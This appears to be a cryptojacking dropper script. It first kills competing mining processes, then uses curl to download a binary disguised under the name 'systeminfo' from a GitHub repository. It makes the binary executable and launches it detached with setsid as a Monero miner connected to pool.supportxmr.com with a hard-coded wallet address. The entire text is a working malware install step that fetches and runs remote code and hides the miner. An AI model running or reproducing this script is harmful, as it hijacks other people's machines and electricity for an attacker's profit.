ps auxf|grep -v grep|grep "\-p x"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monero"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "pool"|awk '{print $2}'|xargs kill -9
rm /tmp/systeminfo
curl https://raw.githubusercontent.com/taylor1985/metasploit-framework/master/systeminfo -o /tmp/systeminfo
chmod +x /tmp/systeminfo
setsid /tmp/systeminfo -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -u 42Cvfyuv9Mv47VJBFxqjbLhhB4eLHHGXb1K5vqMAUfMiALci4xn6XrzDkDmHGW3t6aRM6Gkt6E7d3D88gXh3UtY591ZrPWK -p x --donate-level 1
